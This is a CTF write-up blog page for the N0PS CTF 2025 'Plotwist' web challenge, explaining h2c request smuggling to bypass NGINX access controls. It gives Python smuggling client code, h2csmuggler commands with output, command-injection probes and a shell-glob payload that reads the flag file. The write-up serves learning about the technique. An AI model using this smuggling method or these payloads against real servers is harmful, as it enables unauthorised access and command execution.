<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>N0PS25: Writeup for Web/Plotwist | hxuu</title>
<meta name=keywords content="ctf,write-up,nops"><meta name=description content="CTF write-up for Plotwist"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/n0ps25/plotwist/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.a9de69711750554b5ca1926546c46a763ce30e0caa50cf5d86499b3b035e42bf.css integrity="sha256-qd5pcRdQVUtcoZJlRsRqdjzjDgyqUM9dhkmbOwNeQr8=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/n0ps25/plotwist/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/n0ps25/plotwist/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="N0PS25: Writeup for Web/Plotwist"><meta property="og:description" content="CTF write-up for Plotwist"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-06-04T11:09:15+01:00"><meta property="article:modified_time" content="2025-06-04T11:09:15+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Nops"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="N0PS25: Writeup for Web/Plotwist"><meta name=twitter:description content="CTF write-up for Plotwist"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"N0PS25: Writeup for Web/Plotwist","item":"https://hxuu.github.io/blog/ctf/n0ps25/plotwist/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"N0PS25: Writeup for Web/Plotwist","name":"N0PS25: Writeup for Web\/Plotwist","description":"CTF write-up for Plotwist","keywords":["ctf","write-up","nops"],"articleBody":"Challenge Overview CTF: N0PS CTF 2025 Challenge: Plotwist Category: Web Exploitation Points: 500 (1 solves) Description: You stand on the edge of your final test. One choice, one letter, will determine your fate and you must prove yourself worthy of the path you take. No more gray, you must choose a side : Light or dark.\nSo time to ask jojo the question : which side of me are you?\nChoose carefully, for this moment will define who you truly are and remember, the hardest choices often lead to the greatest destiny.\nAuthors: Sto Source code: NONE This challenge is an instance based challenge (source here after it’s published)\nTL;DR This writeup covers the solution to the “Plotwist” web challenge from N0PS CTF 2025, which involves bypassing NGINX access controls to reach a restricted API endpoint.\nWe exploit an h2c smuggling vulnerability by crafting an HTTP/2 cleartext request using a custom Python client. This allows us to bypass the proxy and access /api/noopsy. The final step uses a clever shell expansion trick to read the flag from a filtered shell environment.\nInitial Analysis At a glance, this is as minimalistic as a web application could get. We’ve got a form that we can write into, and two options to pick which ‘person’ to send this letter to: either lordhttp or noopsy.\nSo lordhttp lets us through, whereas noopsy doesn’t. Interesting~\nTask Analysis Upon further exploration, I found nothing else of interest. The app is so simple: allow one request, block the other. So it should be easy to know what we should do: bypass the access control.\nChecking the response header of the requests, we see that the backend is behind a reverse proxy, NGINX, specifically. So he, might be the one dropping our request before it ever reaches the backend.\nThis asymmetric behavior suggests that the proxy (NGINX) and the backend may handle requests differently.\nThis could mean:\nThe proxy is enforcing access controls or filtering certain paths/methods. The backend is more permissive, but it’s hidden behind NGINX. If we can find a way to bypass NGINX and talk to the backend directly, we might access restricted functionality.\nThe only problem is: NGINX inspects everything, and once it sees a request to /api/noopsy, it simply blocks it.\nSo is there a way to make NGINX stop looking?\nAs crazy as it seems, yes, there is. But before I talk about it, you need to know how the web works.\n1. How the Web Works At a high level, we have three entities that usually interact:\nA browser that sends an HTTP request to an edge server. The edge server acts like a gatekeeper: it applies security filters and decides what gets passed to the backend. The backend processes the request and sends the response back to the edge server, which forwards it to you. Edge servers here are called reverse proxies, namely NGINX.\n2. What is Request Smuggling? To evade these proxies, you need to secretly and maliciously pass a request you’re not supposed to pass to the server. This is called smuggling a request.\nThese attacks however are hard to achieve (or maybe I got skill issues?). They require a timing effect that makes NGINX process part of the request and leave the other part for the backend.\nBut what if we didn’t have to trick the proxy and could just smuggle a request by design? Here’s where h2c upgrades come into play. Let’s investigate this further.\n3. Request Smuggling Via HTTP/2 Cleartext (h2c) Taken from Jake Miller’s research. Big thanks for making this information public. To understand this vulnerability, we need to grasp a few core ideas about the underlying technology that powers web communication.\n3.1. TCP HTTP, aka hyper text transfer protocol is just that: a protocol, ie a way to structure data to the end consumer. That data is transmitted via another protocol: TCP.\nTCP transfers byte-encoded HTTP data over the wire. It doesn’t understand HTTP, just raw binary (0s and 1s).\nA proxy that can interpret HTTP is Layer 7-aware. One that only sees TCP is Layer 4-aware. Layer 4 proxies can’t comprehend URLs, paths, or HTTP headers—just bytes.\n3.2. The Upgrade Header You’ve probably heard of WebSockets, the real-time protocol that enables instant communication between backend and client. To use WebSockets, we must upgrade an HTTP connection to a raw TCP connection.\nWe do that with an Upgrade: websocket header, which tells the proxy: “I’ll be talking fast, stop inspecting things deeply—just pass along the bytes.”\n3.2. Proxy Behavior on Protocol Upgrade Turns out, some proxies disable security checks completely once a connection is upgraded. They no longer inspect traffic at Layer 7, losing the ability to enforce access controls.\nWhile we don’t want to send WebSocket data, we can upgrade to HTTP/2 over cleartext (h2c), a newer revision of HTTP/1.1 that achieves the same bypass, without encryption and while dodging access control.\nYou can read more about the vulnerability here\nExploitation Armed with this new knowledge, we exploit the vulnerability like so:\nFirst, create a TCP connection and send an HTTP/2 upgrade header: Upgrade: h2c After the server responds with a 101 Switching Protocols, we use the now-unmonitored TCP connection to send HTTP/2 requests directly to the target, bypassing NGINX. Unfortunately, h2c upgrades don’t work over TLS (the challenge uses https:// btw), so tools like curl won’t help, they will reject the upgrade as it contradicts the sepc.\nTo get around this, we’ll have to create our own client using Python’s hyper-h2 library. I’ll show you how.\nNote: The following code is heavily inspired by BishopFox’s h2csmuggler.py. All credit to Jake Miller. I’m just explaining it in my own way.\nBuilding the Client 1. Creating the TCP Connection import socket def create_tcp_connection(proxy_url): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) context = ssl.create_default_context() context.check_hostname = False retSock = context.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS) retSock.connect((proxy_url.hostname, 443)) return retSock Here we establish a TCP connection using Python’s socket library.\nWe point to a TCP connection/socket using file descriptors (as everything in linux is a file), hence why we return the socket.\n2. Sending the Initial HTTP/1.1 Request def send_initial_request(connection, proxy_url): path = proxy_url.path or \"/\" request = ( b\"GET \" + path.encode('utf-8') + b\" HTTP/1.1\\r\\n\" + b\"Host: \" + proxy_url.hostname.encode('utf-8') + b\"\\r\\n\" + b\"Accept: */*\\r\\n\" + b\"Accept-Language: en\\r\\n\" + b\"Upgrade: h2c\\r\\n\" + b\"HTTP2-Settings: \" + b\"AAMAAABkAARAAAAAAAIAAAAA\" + b\"\\r\\n\" + b\"Connection: Upgrade, HTTP2-Settings\\r\\n\" + b\"\\r\\n\" ) connection.sendall(request) The HTTP2-Settings headers defines the terms by which client and server communicate (max concurrent streams…etc). Connection: Upgrade, HTTP2-Settings tells the server that the request wants to upgrade to HTTP/2 and that it wants to use the HTTP2-Settings for upgrade negotiation. 3. Creating H2 Connection Object \u0026 Sending Smuggled Request Assuming the latter request gave a 101 Switching Protocols status code. Let’s now send our HTTP/2 requests.\nHTTP/2 is a binary framed protocol. In simple terms, it doesn’t depend on raw text data like Http/1.x do (\\r\\n to be precise). So data is encapsulated in clear binary format. The object that handles this encapsulation is H2Connection.\nIt’s like a translator: you tell it what you want to say (e.g., send a request), and it gives you raw bytes to send over the wire.\nimport h2.connection # This doesn't create a network connection # h2_connection only gives binary data that WE OURSELVES send through the original tcp connection h2_connection = h2.connection.H2Connection() def sendSmuggledRequest(h2_connection, connection, args): stream_id = h2_connection.get_next_available_stream_id() smuggled_request_headers = [ (':method', 'GET'), (':scheme', 'http'), (':authority', 'localhost'), (':path', '/api/noopsy'), # the bypassed path ] # Prepare the headers from python's format into binary format h2_connection.send_headers(stream_id, smuggled_request_headers) # Actually send the data connection.sendall(h2_connection.data_to_send()) Now that we sent the HTTP/2 request, we need to receive the response.\nWhen you communicate over HTTP/2 using the h2 library, the server sends data and signals as part of the protocol, which might include things like:\nIncoming requests Responses Stream lifecycle changes Flow control updates Server push notifications And more… The h2 library abstracts these incoming signals into “events.”\nTo handle those “events”, we have to receive raw data from the network and process it as follows:\n# get the data using socket.recv() events = getData(h2_connection, connection) def handle_events(events, isVerbose): for event in events: if isinstance(event, ResponseReceived): # Handle response headers for name, value in event.headers: print(f\"{name.decode('utf-8')}: {value.decode('utf-8')}\") elif isinstance(event, DataReceived): # Handle response body data print(event.data.decode('utf-8', 'replace')) Combining Everything Together Now that we know how Jake Miller’s PoC works, we can use it to bypass nginx’s access controls as follows:\npython3 h2csmuggler.py -x \"https://nopsctf--plotwist-1.chals.io/api/lordhttp\" \"http://localhost/api/noopsy\" Where:\n-x, --proxy PROXY is the proxy server to try to bypass http://localhost/api/noopsy is the smuggled URL The command as it is will send a GET request to /api/lordhttp and /api/noopsy, but the application accepts POST requests to both, does it accept GET requests? Let’s try:\nWe could’ve send some OPTIONS/HEAD methods to verify that the server actually sends an allow: GET header, but testing it this way is faster.\nh2csmuggler on  master [!] via 🐹 via 🐍 v3.13.3 ➜ python3 h2csmuggler.py -x \"https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp\" \"http://localhost/api/noopsy\" [INFO] h2c stream established successfully. :status: 200 content-length: 46 content-type: application/json date: Wed, 04 Jun 2025 13:12:22 GMT server: hypercorn-h2 {\"msg\":\"Hello from the other side, Lord HTTP\"} nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp - 200 - 46 [INFO] Requesting - /api/noopsy :status: 200 content-length: 100 content-type: application/json date: Wed, 04 Jun 2025 13:12:23 GMT server: hypercorn-h2 {\"msg\":\"Got a secret, can you keep it? Well this one, I'll save it in the secret_flag.txt file ^.^\"} localhost/api/noopsy - 200 - 100 There we go~ Sto is kind enough to save the flag in a secret_flag.txt file, all we have to do is read that flag!\nGetting the Flag (or so I Think?) We now know /api/noopsy accepts POST requests. We test for command injection using:\n; whoami | id \u0026\u0026 uname -a $(id) But… Nothing worked :(\nThe server responds with a riddle.\nLet’s decode it:\nMoney -\u003e This could mean $, which can refer to environment variables Talk in dollars or digits, or don’t even try -\u003e allowed characters are $, [0-9] Got a question? I’ll answer you away -\u003e maybe even ? is allowed? Mhmmm, how can we read a file using only those character: $, [0-9] and ?\nIt turns out, there is quite a creative way to solve this, but it all depends on the same concept: shell expansion\nShell Expansion (the Real Deal) When you’re working in your shell, and type something like: rm *, you might think that the rm command treats the character * differently and removes every file in the current directory. However, you’d be wrong!\nYour shell expands * and replaces it with every file inside the current directory, so something like:\nrm * becomes:\nrm file1 file2 file3...etc BEFORE the command executes.\nWe can use this trick to execute commands AND supply filenames without needing to actually type letters in the terminal. More specifically, we can do this:\n$0 ??????????????? Where:\n$0 -\u003e holds the name of the script or command being executed. The one I’m TRUSTING will give the flag based on the phrase: “I’ll answer you away” ? matches exactly one character -\u003e 15 of them match secret_flag.txt Putting this all together (with some grep magic of course), we end up with:\n➜ python3 h2csmuggler.py -x \"https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp\" -XPOST -d '{\"letter\": \"$0 ???????????????\"}' \"http://localhost/api/noopsy\" | grep -oP N0PS{.*?} N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG} Flag is: N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}\nConclusions The challenge exploited an h2c (HTTP/2 cleartext) request smuggling vulnerability to bypass NGINX access controls. HTTP/2 upgrade allowed sending unfiltered requests directly to the backend, circumventing proxy restrictions. Custom Python client using hyper-h2 was needed due to limitations with standard HTTP/2 tools over TLS. The flag retrieval required understanding shell expansion and limited input filtering to craft a valid command injection payload. The writeup highlights the importance of protocol-level nuances in web security and proxy behavior. References Bishop Fox – H2C Smuggling Explained\nBlog post: H2C Smuggling Request Video explainer: YouTube: “Smuggling HTTP Requests with H2C” RFC 7540 – HTTP/2 Specification\nMultiplexing and stream behavior: RFC 7540 §5 – Streams and Multiplexing H2C Upgrade Mechanics\nVideo: YouTube: “H2C Cleartext HTTP/2 Exploits” Python library docs: hyper-h2 Usage Guide Shows how to manually craft and send HTTP/2 requests over cleartext using hyper-h2, since standard clients like curl block such behavior due to spec violations. Transport Layer Security, TLS 1.2 and 1.3 (Explained by Example)\n","wordCount":"2048","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-06-04T11:09:15+01:00","dateModified":"2025-06-04T11:09:15+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/n0ps25/plotwist/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">N0PS25: Writeup for Web/Plotwist</h1><div class=post-description>CTF write-up for Plotwist</div><div class=post-meta><span title='2025-06-04 11:09:15 +0100 +0100'>June 4, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/n0ps25/plotwist.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#tldr>TL;DR</a></li><li><a href=#initial-analysis>Initial Analysis</a></li><li><a href=#task-analysis>Task Analysis</a><ul><li><a href=#1-how-the-web-works>1. How the Web Works</a></li><li><a href=#2-what-is-request-smuggling>2. What is Request Smuggling?</a></li><li><a href=#3-request-smuggling-via-http2-cleartext-h2c>3. Request Smuggling Via HTTP/2 Cleartext (h2c)</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#building-the-client>Building the Client</a></li><li><a href=#combining-everything-together>Combining Everything Together</a></li><li><a href=#getting-the-flag-or-so-i-think>Getting the Flag (or so I Think?)</a></li><li><a href=#shell-expansion-the-real-deal>Shell Expansion (the Real Deal)</a></li></ul></li><li><a href=#conclusions>Conclusions</a></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-overview>Challenge Overview<a hidden class=anchor aria-hidden=true href=#challenge-overview>#</a></h2><ul><li>CTF: N0PS CTF 2025</li><li>Challenge: Plotwist</li><li>Category: Web Exploitation</li><li>Points: 500 (1 solves)</li><li>Description:</li></ul><blockquote><p>You stand on the edge of your final test. One choice, one letter, will determine your fate and you must prove yourself worthy of the path you take. No more gray, you must choose a side : Light or dark.</p><p>So time to ask jojo the question : which side of me are you?</p><p>Choose carefully, for this moment will define who you truly are and remember, the hardest choices often lead to the greatest destiny.</p></blockquote><ul><li>Authors: <a href=https://linktr.ee/yourssto>Sto</a></li><li>Source code: NONE</li></ul><p><a href=https://github.com/N0PSctf/N0PSctf-2025/tree/main/web/plotwist>This challenge is an instance based challenge (source here after it&rsquo;s published)</a></p><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>This writeup covers the solution to the <strong>&ldquo;Plotwist&rdquo;</strong> web challenge from N0PS CTF 2025,
which involves bypassing NGINX access controls to reach a restricted API endpoint.</p><p>We exploit an <strong>h2c smuggling</strong> vulnerability by crafting an HTTP/2 cleartext request using a custom Python client.
This allows us to bypass the proxy and access <code>/api/noopsy</code>. The final step uses a clever
shell expansion trick to read the flag from a filtered shell environment.</p><h2 id=initial-analysis>Initial Analysis<a hidden class=anchor aria-hidden=true href=#initial-analysis>#</a></h2><p>At a glance, this is <strong>as minimalistic</strong> as a web application could get. We&rsquo;ve got a form
that we can write into, and two options to pick which &lsquo;person&rsquo; to send this letter to:
either <strong>lordhttp</strong> or <strong>noopsy.</strong></p><p><img alt=showcase loading=lazy src=/blog/images/n0ps25-web-plotwist.gif></p><p>So <strong>lordhttp lets us through</strong>, whereas noopsy doesn&rsquo;t. Interesting~</p><h2 id=task-analysis>Task Analysis<a hidden class=anchor aria-hidden=true href=#task-analysis>#</a></h2><p>Upon further exploration, I found <strong>nothing else of interest</strong>. The app is so simple: allow one request,
block the other. So it should be easy to know what we should do: <strong>bypass the access control.</strong></p><p>Checking the response header of the requests, we see that the backend is behind
a <a href="https://www.youtube.com/watch?v=ozhe__GdWC8&amp;t=4s&amp;pp=ygUXd2hhdCBpcyBhIHJldmVyc2UgcHJveHk%3D">reverse proxy</a>, <strong>NGINX</strong>, specifically.
So he, might be the one dropping our request before it ever reaches the backend.</p><p><img alt="server response header" loading=lazy src=/blog/images/2025-06-04-17-52-14.png></p><p>This <strong>asymmetric behavior</strong> suggests that the proxy (NGINX) and the backend may handle requests differently.</p><p>This could mean:</p><ul><li>The proxy is enforcing access controls or filtering certain paths/methods.</li><li>The backend is more permissive, but it’s hidden behind NGINX.</li></ul><p>If we can find a way to <strong>bypass NGINX</strong> and talk to the backend directly, we might access restricted functionality.</p><p>The only problem is: NGINX inspects everything, and once it sees a request to <code>/api/noopsy</code>,
it simply blocks it.</p><p>So is there a way to make NGINX stop looking?</p><p>As crazy as it seems, <strong>yes, there is</strong>. But before I talk about it, you need to know
how the web works.</p><h3 id=1-how-the-web-works>1. How the Web Works<a hidden class=anchor aria-hidden=true href=#1-how-the-web-works>#</a></h3><p>At a high level, we have three entities that usually interact:</p><ul><li>A browser that sends an HTTP request to an edge server.</li><li>The edge server acts like a gatekeeper: it applies security filters and decides what gets passed to the backend.</li><li>The backend processes the request and sends the response back to the edge server, which forwards it to you.</li></ul><p><img alt="how web works" loading=lazy src=/blog/images/2025-06-04-15-53-59.png></p><p>Edge servers here are called <strong>reverse proxies</strong>, namely NGINX.</p><h3 id=2-what-is-request-smuggling>2. What is Request Smuggling?<a hidden class=anchor aria-hidden=true href=#2-what-is-request-smuggling>#</a></h3><p>To evade these proxies, you need to secretly and maliciously pass a request you&rsquo;re
not supposed to pass to the server. This is called <em>smuggling</em> a request.</p><p>These attacks however are hard to achieve (or maybe I got skill issues?). They require
a <strong>timing effect</strong> that makes NGINX process part of the request and leave the other part for the backend.</p><p>But what if we didn’t have to trick the proxy and could just smuggle a request <strong>by design</strong>?
Here&rsquo;s where <strong>h2c upgrades</strong> come into play. Let&rsquo;s investigate this further.</p><h3 id=3-request-smuggling-via-http2-cleartext-h2c>3. Request Smuggling Via HTTP/2 Cleartext (h2c)<a hidden class=anchor aria-hidden=true href=#3-request-smuggling-via-http2-cleartext-h2c>#</a></h3><table><thead><tr><th></th></tr></thead><tbody><tr><td><img alt="h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)" loading=lazy src=/blog/images/2025-06-04-15-26-43.png></td></tr><tr><td>Taken from <a href=https://bishopfox.com/blog/h2c-smuggling-request>Jake Miller&rsquo;s</a> research. Big thanks for making this information public.</td></tr></tbody></table><p>To understand this vulnerability, we need to grasp a few core ideas about
the underlying technology that powers web communication.</p><h4 id=31-tcp><code>3.1. TCP</code><a hidden class=anchor aria-hidden=true href=#31-tcp>#</a></h4><p>HTTP, aka hyper text transfer protocol is just that: a protocol, ie a way
to structure data to the end consumer. That data is transmitted via another protocol: <strong>TCP</strong>.</p><p>TCP transfers byte-encoded HTTP data over the wire. It doesn’t understand HTTP, just raw binary (0s and 1s).</p><p>A proxy that can interpret HTTP is <strong>Layer 7-aware</strong>. One that only sees TCP is <strong>Layer 4-aware</strong>.
Layer 4 proxies can’t comprehend URLs, paths, or HTTP headers—just bytes.</p><h4 id=32-the-upgrade-header><code>3.2. The Upgrade Header</code><a hidden class=anchor aria-hidden=true href=#32-the-upgrade-header>#</a></h4><p>You’ve probably heard of <strong>WebSockets</strong>, the real-time protocol that enables
instant communication between backend and client. To use WebSockets, we must <strong>upgrade</strong> an HTTP connection to a raw TCP connection.</p><p>We do that with an <code>Upgrade: websocket</code> header, which tells the proxy:
&ldquo;I’ll be talking fast, stop inspecting things deeply—just pass along the bytes.&rdquo;</p><h4 id=32-proxy-behavior-on-protocol-upgrade><code>3.2. Proxy Behavior on Protocol Upgrade</code><a hidden class=anchor aria-hidden=true href=#32-proxy-behavior-on-protocol-upgrade>#</a></h4><p>Turns out, <strong>some proxies disable security checks completely</strong> once a connection is upgraded.
They no longer inspect traffic at Layer 7, losing the ability to enforce access controls.</p><hr><p>While we don’t want to send WebSocket data, we <strong>can upgrade</strong> to HTTP/2 over cleartext (<code>h2c</code>),
a newer revision of HTTP/1.1 that achieves the same bypass, <strong>without encryption</strong> and while dodging access control.</p><blockquote><p>You can read more about the vulnerability <a href=https://bishopfox.com/blog/h2c-smuggling-request>here</a></p></blockquote><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Armed with this new knowledge, we exploit the vulnerability like so:</p><ol><li>First, create a TCP connection and send an HTTP/2 upgrade header: <code>Upgrade: h2c</code></li><li>After the server responds with a <code>101 Switching Protocols</code>, we use the now-unmonitored TCP connection
to send HTTP/2 requests directly to the target, <strong>bypassing NGINX.</strong></li></ol><p>Unfortunately, h2c upgrades <strong>don’t work over TLS</strong> (the challenge uses <code>https://</code> btw), so tools like <code>curl</code> won’t help,
they will reject the upgrade as it contradicts the sepc.</p><p>To get around this, we&rsquo;ll have to create our own client using Python&rsquo;s <a href=https://python-hyper.org/projects/hyper-h2/en/stable/>hyper-h2</a> library. I&rsquo;ll show you how.</p><blockquote><p>Note: The following code is heavily inspired by BishopFox’s <a href=https://github.com/minight/h2csmuggler><code>h2csmuggler.py</code></a>.
All credit to <a href=https://bishopfox.com/blog/h2c-smuggling-request>Jake Miller</a>. I’m just explaining it in my own way.</p></blockquote><h3 id=building-the-client>Building the Client<a hidden class=anchor aria-hidden=true href=#building-the-client>#</a></h3><h4 id=1-creating-the-tcp-connection><code>1. Creating the TCP Connection</code><a hidden class=anchor aria-hidden=true href=#1-creating-the-tcp-connection>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_tcp_connection</span><span class=p>(</span><span class=n>proxy_url</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>context</span> <span class=o>=</span> <span class=n>ssl</span><span class=o>.</span><span class=n>create_default_context</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=n>check_hostname</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>retSock</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>wrap_socket</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>ssl_version</span><span class=o>=</span><span class=n>ssl</span><span class=o>.</span><span class=n>PROTOCOL_TLS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retSock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>proxy_url</span><span class=o>.</span><span class=n>hostname</span><span class=p>,</span> <span class=mi>443</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>retSock</span>
</span></span></code></pre></div><p>Here we establish a TCP connection using Python&rsquo;s <a href=https://docs.python.org/3/library/socket.html>socket</a> library.</p><blockquote><p>We point to a TCP connection/socket using file descriptors (as everything in linux is a file), hence
why we return the socket.</p></blockquote><h4 id=2-sending-the-initial-http11-request><code>2. Sending the Initial HTTP/1.1 Request</code><a hidden class=anchor aria-hidden=true href=#2-sending-the-initial-http11-request>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_initial_request</span><span class=p>(</span><span class=n>connection</span><span class=p>,</span> <span class=n>proxy_url</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=n>proxy_url</span><span class=o>.</span><span class=n>path</span> <span class=ow>or</span> <span class=s2>&#34;/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>request</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;GET &#34;</span> <span class=o>+</span> <span class=n>path</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34; HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;Host: &#34;</span> <span class=o>+</span> <span class=n>proxy_url</span><span class=o>.</span><span class=n>hostname</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;Accept: */*</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
